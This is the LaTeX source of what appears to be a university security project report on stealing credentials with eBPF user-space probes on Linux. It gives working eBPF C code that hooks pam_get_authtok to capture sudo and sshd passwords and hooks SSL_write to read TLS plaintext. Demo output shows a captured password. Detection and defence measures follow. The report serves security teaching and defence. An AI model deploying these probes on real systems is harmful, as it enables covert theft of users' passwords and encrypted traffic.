\documentclass[11pt,a4paper]{article}

% --- Packages ---
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage[margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{booktabs}
\usepackage{enumitem}
\usepackage{amsmath}
\usepackage{caption}
\usepackage{float}
\usepackage{parskip}
\usepackage{fancyhdr}
\usepackage[backend=biber,style=ieee]{biblatex}

% --- Bibliography ---
\addbibresource{references.bib}

% --- Colors ---
\definecolor{codebg}{RGB}{245,245,245}
\definecolor{codeframe}{RGB}{200,200,200}
\definecolor{keyword}{RGB}{0,0,180}
\definecolor{comment}{RGB}{0,128,0}
\definecolor{string}{RGB}{163,21,21}
\definecolor{accent}{RGB}{0,90,160}

% --- Listings ---
\lstdefinestyle{cstyle}{
    language=C,
    backgroundcolor=\color{codebg},
    frame=single,
    rulecolor=\color{codeframe},
    basicstyle=\ttfamily\small,
    keywordstyle=\color{keyword}\bfseries,
    commentstyle=\color{comment}\itshape,
    stringstyle=\color{string},
    breaklines=true,
    numbers=left,
    numberstyle=\tiny\color{gray},
    numbersep=8pt,
    tabsize=4,
    showstringspaces=false,
    captionpos=b,
    xleftmargin=1.5em,
    framexleftmargin=1.5em,
}

\lstdefinestyle{pythonstyle}{
    language=Python,
    backgroundcolor=\color{codebg},
    frame=single,
    rulecolor=\color{codeframe},
    basicstyle=\ttfamily\small,
    keywordstyle=\color{keyword}\bfseries,
    commentstyle=\color{comment}\itshape,
    stringstyle=\color{string},
    breaklines=true,
    numbers=left,
    numberstyle=\tiny\color{gray},
    numbersep=8pt,
    tabsize=4,
    showstringspaces=false,
    captionpos=b,
    xleftmargin=1.5em,
    framexleftmargin=1.5em,
}

\lstdefinestyle{shellstyle}{
    backgroundcolor=\color{codebg},
    frame=single,
    rulecolor=\color{codeframe},
    basicstyle=\ttfamily\small,
    breaklines=true,
    numbers=none,
    showstringspaces=false,
    captionpos=b,
    xleftmargin=1.5em,
    framexleftmargin=1.5em,
}

% --- Allow linebreaks in \texttt ---
\usepackage[htt]{hyphenat}

% --- Header / Footer ---
\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{\small\textit{ADSS -- Serverless Credential Theft with eBPF Uprobes}}
\fancyhead[R]{\small\thepage}
\renewcommand{\headrulewidth}{0.4pt}

% --- Hyperlinks ---
\hypersetup{
    colorlinks=true,
    linkcolor=accent,
    citecolor=accent,
    urlcolor=accent,
}

% ============================================================================
\begin{document}

% --- Title Page ---
\begin{titlepage}
    \centering
    \vspace*{2cm}

    {\Large Hochschule Luzern -- Informatik\\[0.3em]}
    {\large Advanced Security (ADSS) -- Final Project\\[2cm]}

    \rule{\textwidth}{1pt}\\[0.6cm]
    {\Huge\bfseries Serverless Credential Theft\\with eBPF Uprobes\\[0.4cm]}
    \rule{\textwidth}{1pt}\\[1.5cm]

    {\large Intercepting Cleartext Credentials and TLS Traffic\\
    via User-Space Probes on Linux\\[3cm]}

    {\large
    \begin{tabular}{ll}
        \textbf{Author:}  & TODO \\
        \textbf{Date:}    & \today \\
        \textbf{Module:}  & Advanced Security (ADSS) \\
    \end{tabular}
    }

    \vfill
    {\small\textit{Disclaimer: This project is for educational and authorized research purposes only.}}
\end{titlepage}

% --- Table of Contents ---
\newpage
\tableofcontents
\newpage

% ============================================================================
\section{Introduction}
\label{sec:introduction}
% ============================================================================

Traditional approaches to credential theft on Linux systems rely on well-known
techniques such as keyloggers, memory dumps, or network sniffing. Each of these
methods carries significant operational drawbacks: keyloggers are noisy and must
persist as user-space processes, memory forensics requires precise timing and
knowledge of data structures, and network sniffing is rendered ineffective by
ubiquitous encryption (TLS/SSH).

This project demonstrates a fundamentally different approach:
\textbf{serverless credential theft using eBPF user-space probes (uprobes)}.
Rather than recording all input or attempting to break encryption, the technique
places a precise, surgical tap at the exact point in memory where a password or
plaintext payload exists---after decryption but before hashing or further
processing.

The core idea is analogous to a sniper rifle versus a dragnet: instead of
capturing everything and filtering later, the attacker instruments a single
library function and waits. When a victim authenticates, the eBPF program
fires, reads the cleartext credential directly from a CPU register or stack
argument, and stores it silently. The legitimate application continues
uninterrupted; no log entries are created and no anomalous network traffic is
generated at the moment of theft.

We implement and demonstrate two attack vectors in a single tool:

\begin{enumerate}
    \item \textbf{PAM authentication interception} -- capturing passwords from
          \texttt{sudo}, \texttt{su}, \texttt{ssh} (server-side), and any
          PAM-aware service by hooking \texttt{pam\_get\_authtok} in
          \texttt{libpam.so}.
    \item \textbf{SSL/TLS plaintext interception} -- reading HTTP requests and
          responses in cleartext by hooking \texttt{SSL\_write} and
          \texttt{SSL\_read} in \texttt{libssl.so}, bypassing TLS encryption
          entirely.
\end{enumerate}

The remainder of this report is structured as follows.
Section~\ref{sec:background} introduces eBPF, uprobes, and the targeted
libraries. Section~\ref{sec:design} describes the architecture and
implementation of the tool. Section~\ref{sec:demonstration} walks through
practical usage scenarios. Section~\ref{sec:detection} discusses detection
methods and defensive measures. Section~\ref{sec:limitations} covers
limitations and potential extensions. Section~\ref{sec:conclusion} concludes
the report.


% ============================================================================
\section{Background}
\label{sec:background}
% ============================================================================

% ----------------------------------------------------------------------------
\subsection{Extended Berkeley Packet Filter (eBPF)}
\label{subsec:ebpf}
% ----------------------------------------------------------------------------

eBPF (Extended Berkeley Packet Filter) is a technology built into the Linux
kernel that allows user-supplied programs to run in a sandboxed virtual machine
inside kernel space. Originally designed for packet filtering, eBPF has evolved
into a general-purpose in-kernel execution engine used for observability,
networking, and security \cite{gregg2019}.

Key properties of eBPF relevant to this project:

\begin{itemize}
    \item \textbf{Safety guarantees.} Before loading, every eBPF program is
          analyzed by an in-kernel verifier that ensures the program terminates,
          does not access out-of-bounds memory, and does not crash the kernel.
          This makes eBPF programs safe to run---ironically, even when their
          intent is malicious.
    \item \textbf{Minimal overhead.} eBPF programs are JIT-compiled to native
          machine code. An attached probe fires only when its hook point is
          triggered, making the technique essentially zero-cost when idle.
    \item \textbf{Root-only loading.} Loading eBPF programs requires
          \texttt{CAP\_BPF} (or \texttt{CAP\_SYS\_ADMIN} on older kernels).
          This means the attacker must already have root access---the technique
          is a post-exploitation persistence and data collection mechanism,
          not an initial access vector.
    \item \textbf{No kernel module required.} Unlike traditional rootkits that
          require a loadable kernel module (LKM), eBPF programs are loaded via
          the \texttt{bpf()} syscall and do not appear in \texttt{lsmod} output.
\end{itemize}

% ----------------------------------------------------------------------------
\subsection{Probes: Kprobes and Uprobes}
\label{subsec:probes}
% ----------------------------------------------------------------------------

eBPF programs are attached to \textit{hook points} in the system. Two families
of dynamic probes are relevant:

\begin{description}
    \item[Kprobes (Kernel Probes)] attach to functions inside the kernel. For
        example, a kprobe on \texttt{tcp\_sendmsg} would fire every time any
        process sends TCP data.
    \item[Uprobes (User-Space Probes)] attach to functions inside user-space
        binaries or shared libraries. A uprobe on \texttt{SSL\_write} in
        \texttt{libssl.so} fires every time \textit{any} process linked against
        that library calls \texttt{SSL\_write}.
\end{description}

Both probe types support two variants:

\begin{itemize}
    \item \textbf{Entry probes} fire when the function is entered. At this
          point, function arguments are available in CPU registers (following
          the System V AMD64 ABI: \texttt{\%rdi}, \texttt{\%rsi},
          \texttt{\%rdx}, \texttt{\%rcx}, \texttt{\%r8}, \texttt{\%r9}).
    \item \textbf{Return probes} (uretprobes) fire when the function returns.
          At this point, the return value is in \texttt{\%rax}, and
          output parameters written during the function's execution can be read
          from the pointers captured at entry time.
\end{itemize}

Uprobes work by temporarily replacing the first byte of the target function
with an \texttt{INT3} (breakpoint) instruction. When the CPU hits this
instruction, it traps into the kernel, which dispatches the eBPF program,
then restores the original instruction and resumes execution
\cite{kernel_uprobe}.

% ----------------------------------------------------------------------------
\subsection{BCC (BPF Compiler Collection)}
\label{subsec:bcc}
% ----------------------------------------------------------------------------

BCC is a toolkit that simplifies eBPF development by providing a Python (and
Lua) frontend \cite{bcc_repo}. The developer writes the eBPF probe logic in a
restricted subset of C, which BCC compiles to eBPF bytecode at runtime using
LLVM/Clang. The Python wrapper handles:

\begin{itemize}
    \item Compilation of the C source to eBPF bytecode.
    \item Loading and verification of the program via the \texttt{bpf()} syscall.
    \item Attaching the program to the specified hook points.
    \item Reading data from eBPF maps (shared memory between kernel and
          user space) or the trace pipe.
\end{itemize}

This project uses BCC to keep the implementation self-contained in a single
Python script with an embedded C program.

% ----------------------------------------------------------------------------
\subsection{Target Libraries}
\label{subsec:targets}
% ----------------------------------------------------------------------------

\subsubsection{PAM (Pluggable Authentication Modules)}

PAM is the standard authentication framework on Linux \cite{pam_docs}. When a
user authenticates via \texttt{sudo}, \texttt{su}, \texttt{sshd}, \texttt{login},
or any PAM-aware service, the following call chain occurs:

\begin{enumerate}
    \item The service calls \texttt{pam\_authenticate()}.
    \item Internally, the PAM module calls
          \texttt{pam\_get\_authtok(pamh, PAM\_AUTHTOK, \&password, prompt)}.
    \item On return, \texttt{password} points to a null-terminated string
          containing the user's cleartext password.
\end{enumerate}

The function signature is:

\begin{lstlisting}[style=cstyle, caption={pam\_get\_authtok signature}, label={lst:pam_sig}]
int pam_get_authtok(pam_handle_t *pamh, int item,
                    const char **authtok, const char *prompt);
\end{lstlisting}

The third parameter (\texttt{authtok}) is an output pointer---on return,
\texttt{*authtok} contains the address of the cleartext password string. This
is the value we intercept.

\subsubsection{OpenSSL (libssl)}

OpenSSL's \texttt{libssl.so} provides the TLS implementation used by
\texttt{curl}, \texttt{wget}, \texttt{python-requests}, web servers, and
countless other applications \cite{openssl_docs}. The two functions of
interest are:

\begin{lstlisting}[style=cstyle, caption={SSL\_write and SSL\_read signatures}, label={lst:ssl_sig}]
int SSL_write(SSL *ssl, const void *buf, int num);
int SSL_read(SSL *ssl, void *buf, int num);
\end{lstlisting}

\begin{itemize}
    \item \texttt{SSL\_write}: The \texttt{buf} parameter contains plaintext
          data \textit{before} encryption. Hooking at entry allows us to read
          outgoing data (e.g., HTTP requests, API keys, POST bodies).
    \item \texttt{SSL\_read}: The \texttt{buf} parameter is populated with
          plaintext data \textit{after} decryption when the function returns.
          Hooking at return allows us to read incoming data (e.g., HTTP
          responses).
\end{itemize}


% ============================================================================
\section{Design and Implementation}
\label{sec:design}
% ============================================================================

% ----------------------------------------------------------------------------
\subsection{Architecture Overview}
\label{subsec:architecture}
% ----------------------------------------------------------------------------

The tool consists of a single Python script (\texttt{ebpf\_spy.py}) with two
logical components:

\begin{enumerate}
    \item \textbf{eBPF C program} (embedded as a string) -- compiled and loaded
          into the kernel at runtime by BCC. Contains the probe functions and
          shared data maps.
    \item \textbf{Python userspace loader} -- handles library discovery,
          argument parsing, probe attachment, and output formatting.
\end{enumerate}

Figure~\ref{fig:architecture} illustrates the data flow.

\begin{figure}[H]
\centering
\small
\begin{verbatim}
    +------------------+          +------------------+
    |   User Process   |          |   User Process   |
    |  (sudo, curl,..) |          |  (sudo, curl,..) |
    +--------+---------+          +--------+---------+
             |                             |
             | calls pam_get_authtok()     | calls SSL_write()/SSL_read()
             v                             v
    +--------+---------+          +--------+---------+
    |   libpam.so      |          |   libssl.so      |
    | [INT3 inserted]  |          | [INT3 inserted]  |
    +--------+---------+          +--------+---------+
             |                             |
             | trap to kernel              | trap to kernel
             v                             v
    +--------------------------------------------------+
    |              Linux Kernel (eBPF VM)               |
    |                                                   |
    |  trace_pam_entry()   trace_ssl_write()            |
    |  trace_pam_return()  trace_ssl_read_entry()       |
    |                      trace_ssl_read_return()      |
    |                                                   |
    |  [ BPF_HASH maps: pam_params_map, ssl_read_map ] |
    +----------------------------+----------------------+
                                 |
                                 | trace_pipe / bpf_trace_printk
                                 v
    +----------------------------+----------------------+
    |            ebpf_spy.py (Python, root)             |
    |  - Compiles & loads BPF program                   |
    |  - Attaches uprobes to library functions           |
    |  - Reads and displays intercepted data            |
    +--------------------------------------------------+
\end{verbatim}
\caption{Architecture and data flow of the eBPF spy tool.}
\label{fig:architecture}
\end{figure}

% ----------------------------------------------------------------------------
\subsection{eBPF Data Maps}
\label{subsec:maps}
% ----------------------------------------------------------------------------

The eBPF program uses two \texttt{BPF\_HASH} maps to pass data between entry
and return probes within the same function invocation:

\begin{table}[H]
\centering
\caption{eBPF hash maps used in the tool.}
\label{tab:maps}
\begin{tabular}{@{}llll@{}}
\toprule
\textbf{Map Name}      & \textbf{Key}  & \textbf{Value}      & \textbf{Purpose} \\
\midrule
\texttt{pam\_params\_map} & Thread ID & \texttt{char **} (pointer to authtok) & Pass authtok address from entry to return \\
\texttt{ssl\_read\_map}   & Thread ID & \texttt{char *} (buffer address)      & Pass buffer address from entry to return \\
\bottomrule
\end{tabular}
\end{table}

Maps are necessary because CPU registers are not preserved between the entry
probe and the return probe---the function execution overwrites them. By storing
the relevant pointer in a map keyed by the current thread ID, the return probe
can retrieve it and dereference the now-populated output parameter.

% ----------------------------------------------------------------------------
\subsection{PAM Interception}
\label{subsec:pam_impl}
% ----------------------------------------------------------------------------

The PAM interception uses a two-stage uprobe/uretprobe pattern:

\textbf{Stage 1 -- Entry (\texttt{trace\_pam\_entry}):}
When \texttt{pam\_get\_authtok} is called, the third argument (\texttt{\%rdx}
on x86\_64, accessed via \texttt{PT\_REGS\_PARM3}) contains the address of the
\texttt{authtok} output pointer. This address is saved into
\texttt{pam\_params\_map}.

\begin{lstlisting}[style=cstyle, caption={PAM entry probe}, label={lst:pam_entry}]
int trace_pam_entry(struct pt_regs *ctx) {
    struct key_t key = {};
    char **authtok_ptr_addr;

    key.pid = bpf_get_current_pid_tgid();
    authtok_ptr_addr = (char **)PT_REGS_PARM3(ctx);
    pam_params_map.update(&key, &authtok_ptr_addr);
    return 0;
}
\end{lstlisting}

\textbf{Stage 2 -- Return (\texttt{trace\_pam\_return}):}
When \texttt{pam\_get\_authtok} returns, the output pointer has been populated
by the PAM module. The return probe looks up the saved address, performs two
levels of pointer dereferencing using \texttt{bpf\_probe\_read\_user}, and
reads the cleartext password string.

\begin{lstlisting}[style=cstyle, caption={PAM return probe}, label={lst:pam_return}]
int trace_pam_return(struct pt_regs *ctx) {
    struct key_t key = {};
    char ***authtok_pp;
    char **authtok_p;
    char *authtok_val;
    char captured_str[80] = {};

    key.pid = bpf_get_current_pid_tgid();
    authtok_pp = pam_params_map.lookup(&key);
    if (authtok_pp == 0) return 0;

    authtok_p = *authtok_pp;
    bpf_probe_read_user(&authtok_val, sizeof(authtok_val), authtok_p);
    bpf_probe_read_user_str(captured_str, sizeof(captured_str), authtok_val);
    bpf_trace_printk("PAM Spy: PID %d returned authtok='%s'\n",
                     key.pid, captured_str);
    pam_params_map.delete(&key);
    return 0;
}
\end{lstlisting}

The double indirection is necessary because \texttt{pam\_get\_authtok} takes a
\texttt{const char **authtok}---a pointer to a pointer. At entry, we capture the
address of the pointer (\texttt{char **}). At return, we first read where the
pointer now points (\texttt{char *}), then read the string at that address.

% ----------------------------------------------------------------------------
\subsection{SSL/TLS Interception}
\label{subsec:ssl_impl}
% ----------------------------------------------------------------------------

SSL interception requires different strategies for write and read operations:

\textbf{SSL\_write -- Entry probe only:}
The plaintext buffer is the second argument (\texttt{PT\_REGS\_PARM2}). Since
the data exists in the buffer \textit{before} the function executes (it is an
input parameter), a single entry probe suffices.

\begin{lstlisting}[style=cstyle, caption={SSL\_write entry probe}, label={lst:ssl_write}]
int trace_ssl_write(struct pt_regs *ctx) {
    char *buf_addr;
    char captured_data[80] = {};
    u32 pid = bpf_get_current_pid_tgid();

    buf_addr = (char *)PT_REGS_PARM2(ctx);
    bpf_probe_read_user(captured_data, sizeof(captured_data), buf_addr);
    bpf_trace_printk("SSL WRITE (PID %d): %s\n", pid, captured_data);
    return 0;
}
\end{lstlisting}

\textbf{SSL\_read -- Entry + return probe:}
The buffer address is available at entry (second argument), but the data is
only written into the buffer by OpenSSL during the function's execution. Thus,
the entry probe saves the buffer address to \texttt{ssl\_read\_map}, and the
return probe reads the now-populated buffer.

% ----------------------------------------------------------------------------
\subsection{Library Discovery}
\label{subsec:discovery}
% ----------------------------------------------------------------------------

The Python loader must locate the shared libraries on disk to attach uprobes.
It uses a two-step strategy:

\begin{enumerate}
    \item \texttt{ctypes.util.find\_library()} -- queries the system's dynamic
          linker cache (\texttt{ldconfig}).
    \item Fallback to a list of common absolute paths for various distributions
          (Debian/Ubuntu, RHEL/CentOS, Arch).
\end{enumerate}

The user can also override library paths via \texttt{-{}-libpam} and
\texttt{-{}-libssl} command-line arguments.


% ============================================================================
\section{Demonstration}
\label{sec:demonstration}
% ============================================================================

This section demonstrates the tool against three realistic scenarios. All tests
were performed on an Ubuntu/Debian-based system with kernel 6.x and BCC
installed.

% ----------------------------------------------------------------------------
\subsection{Scenario 1: Intercepting \texttt{sudo} Passwords}
\label{subsec:demo_pam}
% ----------------------------------------------------------------------------

\textbf{Setup:} Start the tool in PAM mode.

\begin{lstlisting}[style=shellstyle]
$ sudo python3 ebpf_spy.py --mode pam
[*] Compiling BPF program...
[*] Attaching PAM probes to /lib/x86_64-linux-gnu/libpam.so.0...
    -> PAM probes attached.
------------------------------------------------------------
[*] Listening... (Mode: pam)
\end{lstlisting}

\textbf{Trigger:} In a second terminal, a user runs \texttt{sudo ls} and enters
their password.

\textbf{Result:}
\begin{lstlisting}[style=shellstyle]
sudo-1234  [002] .... 12345.678: PAM Spy: PID 1234 returned authtok='s3cretP@ss!'
\end{lstlisting}

The cleartext password is captured the instant the PAM module receives it,
before it is hashed for comparison against \texttt{/etc/shadow}.

% ----------------------------------------------------------------------------
\subsection{Scenario 2: Intercepting HTTPS Traffic}
\label{subsec:demo_ssl}
% ----------------------------------------------------------------------------

\textbf{Setup:} Start the tool in SSL mode.

\begin{lstlisting}[style=shellstyle]
$ sudo python3 ebpf_spy.py --mode ssl
[*] Compiling BPF program...
[*] Attaching SSL probes to /usr/lib/x86_64-linux-gnu/libssl.so.3...
    -> SSL probes attached.
------------------------------------------------------------
[*] Listening... (Mode: ssl)
\end{lstlisting}

\textbf{Trigger:} In a second terminal, run \texttt{curl https://example.com}.

\textbf{Result:}
\begin{lstlisting}[style=shellstyle]
curl-5678 [001] .... 12346.789: SSL WRITE (PID 5678): GET / HTTP/1.1
Host: example.com
User-Agent: curl/7.88
curl-5678 [001] .... 12346.800: SSL READ (PID 5678): HTTP/1.1 200 OK
Content-Type: text/html
\end{lstlisting}

The full HTTP request and response are captured in cleartext, despite the
connection being encrypted with TLS. Any sensitive data in transit---cookies,
authorization headers, API keys, POST bodies---would be visible.

% ----------------------------------------------------------------------------
\subsection{Scenario 3: SSH Server-Side Password Capture}
\label{subsec:demo_ssh}
% ----------------------------------------------------------------------------

\textbf{Setup:} On a server running \texttt{sshd}, start the tool in PAM mode.

When a remote user connects via \texttt{ssh user@server} and enters their
password, the tool captures it identically to the \texttt{sudo} scenario.
This is because \texttt{sshd} uses PAM for password authentication and calls
the same \texttt{pam\_get\_authtok} function.

\textbf{Note on SSH client-side capture:} Capturing passwords on the
\textit{client} side (i.e., the password typed into the \texttt{ssh} command)
is more complex because the \texttt{ssh} binary is typically stripped of debug
symbols. The README describes two strategies: installing debug symbols to hook
\texttt{read\_passphrase}, or hooking \texttt{libc}'s \texttt{read()} syscall
wrapper filtered by process name and file descriptor. These are not implemented
in the current version but represent viable extensions.


% ============================================================================
\section{Detection and Defense}
\label{sec:detection}
% ============================================================================

While the technique is stealthy, it is not invisible. This section discusses
how defenders can detect and mitigate eBPF-based credential theft.

% ----------------------------------------------------------------------------
\subsection{Detection Methods}
\label{subsec:detection_methods}
% ----------------------------------------------------------------------------

\begin{description}
    \item[eBPF program enumeration.]
        The \texttt{bpftool} utility can list all loaded eBPF programs:
        \begin{lstlisting}[style=shellstyle]
$ sudo bpftool prog list
42: kprobe  name trace_pam_entry  tag abc123  gpl
43: kprobe  name trace_pam_return tag def456  gpl
        \end{lstlisting}
        Any unexpected programs---especially those with names referencing
        \texttt{pam}, \texttt{ssl}, or \texttt{trace}---warrant investigation.

    \item[Uprobe event inspection.]
        Active uprobes are listed in the kernel's tracefs:
        \begin{lstlisting}[style=shellstyle]
$ sudo cat /sys/kernel/debug/tracing/uprobe_events
p:uprobes/... /lib/.../libpam.so.0:0x... trace_pam_entry
        \end{lstlisting}
        An unexpected uprobe on \texttt{libpam.so} or \texttt{libssl.so} is a
        strong indicator of compromise.

    \item[Process monitoring.]
        The Python loader process (\texttt{ebpf\_spy.py}) must remain running
        to read output from the trace pipe. Standard process monitoring or EDR
        tools may flag a root-owned Python process reading from
        \texttt{/sys/kernel/debug/tracing/trace\_pipe}.

    \item[Audit subsystem.]
        The Linux audit framework can be configured to log \texttt{bpf()}
        syscalls:
        \begin{lstlisting}[style=shellstyle]
$ sudo auditctl -a always,exit -F arch=b64 -S bpf -k ebpf_audit
        \end{lstlisting}
        This creates an audit trail whenever eBPF programs are loaded.
\end{description}

% ----------------------------------------------------------------------------
\subsection{Defensive Measures}
\label{subsec:defenses}
% ----------------------------------------------------------------------------

\begin{description}
    \item[Restrict eBPF access.]
        Set \texttt{kernel.unprivileged\_bpf\_disabled=1} via sysctl to prevent
        unprivileged eBPF usage. On hardened systems, consider using
        \textbf{lockdown mode}
        (\texttt{kernel\_lockdown=\allowbreak{}integrity} or
        \texttt{confidentiality}) which restricts eBPF capabilities even for
        root.

    \item[Secure Boot and module signing.]
        While eBPF does not use kernel modules, Secure Boot with lockdown mode
        prevents loading arbitrary eBPF programs that access kernel memory.

    \item[SELinux / AppArmor policies.]
        Mandatory Access Control frameworks can restrict which processes are
        allowed to use the \texttt{bpf()} syscall and which files they can
        attach probes to.

    \item[Runtime integrity monitoring.]
        Tools like \textbf{Tracee} (by Aqua Security) or \textbf{Falco}
        (by Sysdig) use eBPF themselves to monitor for suspicious eBPF program
        loads and attachment events---essentially using the technology to defend
        against itself.

    \item[Hardware security tokens.]
        For SSH authentication, using FIDO2/U2F hardware keys eliminates
        password-based authentication entirely, rendering PAM password
        interception ineffective.
\end{description}


% ============================================================================
\section{Limitations and Future Work}
\label{sec:limitations}
% ============================================================================

% ----------------------------------------------------------------------------
\subsection{Current Limitations}
\label{subsec:limitations}
% ----------------------------------------------------------------------------

\begin{enumerate}
    \item \textbf{Requires root access.} The technique is post-exploitation
          only. An attacker must already have root (or \texttt{CAP\_BPF}) to
          load eBPF programs.

    \item \textbf{Capture buffer size.} The eBPF verifier imposes strict limits
          on stack size (512 bytes). Our 80-byte capture buffer is sufficient
          for passwords but truncates longer SSL payloads.

    \item \textbf{Output via \texttt{trace\_pipe}.} Using
          \texttt{bpf\_trace\_printk} writes to a shared global trace buffer.
          Output from other tracing tools or kernel debug messages may
          intermix. The trace pipe is also limited to roughly 1000 characters
          per message.

    \item \textbf{PID filtering granularity.} The current implementation uses
          the lower 32 bits of \texttt{bpf\_get\_current\_\allowbreak{}pid\_tgid()},
          which is the kernel thread ID (TID), not the user-space PID (TGID).
          This can cause incorrect behavior for multi-threaded applications.

    \item \textbf{Stripped binaries.} The tool cannot hook functions in
          stripped binaries (e.g., the default \texttt{ssh} client) because
          uprobes require symbol names to resolve function addresses.

    \item \textbf{No process name in output.} The current output includes only
          the PID, making it harder to quickly identify which application
          triggered the probe.
\end{enumerate}

% ----------------------------------------------------------------------------
\subsection{Future Work}
\label{subsec:future}
% ----------------------------------------------------------------------------

\begin{enumerate}
    \item \textbf{Perf event output.} Replace \texttt{bpf\_trace\_printk} with
          \texttt{BPF\_PERF\_OUTPUT} or \texttt{BPF\_RINGBUF} for a dedicated,
          higher-bandwidth output channel with structured data.

    \item \textbf{SSH client-side capture.} Implement Strategy B from the
          README: hook \texttt{libc}'s \texttt{read()} filtered by process
          name (\texttt{ssh}) and file descriptor (stdin, fd~0).

    \item \textbf{Process metadata.} Use \texttt{bpf\_get\_current\_comm()} to
          include the process name in output events, and correct the PID
          extraction to use \texttt{bpf\_get\_current\_pid\_tgid() >> 32}.

    \item \textbf{Covert exfiltration.} Demonstrate exfiltration channels such
          as writing to a hidden file, DNS tunneling, or ICMP covert channels
          to illustrate the full attack lifecycle.

    \item \textbf{Containerized environments.} Test and document behavior in
          Docker/Kubernetes environments where the host kernel's eBPF subsystem
          can be leveraged to spy on containerized workloads.

    \item \textbf{Additional library targets.} Extend to other libraries such
          as \texttt{libgnutls} (used by \texttt{wget} on some distributions),
          \texttt{libssh}, or application-specific libraries.
\end{enumerate}


% ============================================================================
\section{Conclusion}
\label{sec:conclusion}
% ============================================================================

This project demonstrates that eBPF user-space probes represent a powerful and
stealthy post-exploitation technique for credential theft on Linux systems. By
attaching uprobes to \texttt{pam\_get\_authtok} in \texttt{libpam.so} and
\texttt{SSL\_write}/\texttt{SSL\_read} in \texttt{libssl.so}, an attacker with
root access can silently intercept cleartext passwords and TLS-protected
traffic without modifying any files, generating network anomalies, or deploying
a traditional rootkit.

The technique exploits a fundamental architectural property: shared libraries
are loaded into every process that uses them, and uprobes are system-wide. A
single probe attachment intercepts calls from \textit{all} processes---every
\texttt{sudo}, \texttt{su}, \texttt{ssh} login, \texttt{curl} request, and
Python HTTPS call on the system.

From a defensive perspective, the technique is detectable through eBPF program
enumeration (\texttt{bpftool}), uprobe event inspection, and audit logging of
the \texttt{bpf()} syscall. Kernel lockdown mode, mandatory access control
policies, and hardware-based authentication provide effective mitigations.

The key takeaway for security practitioners is that eBPF has shifted the
attacker's toolkit from noisy kernel modules to verified, JIT-compiled,
low-overhead programs that the kernel itself is designed to execute safely.
Defenders must adapt their monitoring to account for this capability.


% ============================================================================
% REFERENCES
% ============================================================================
\newpage
\printbibliography[title={References}]

\end{document}
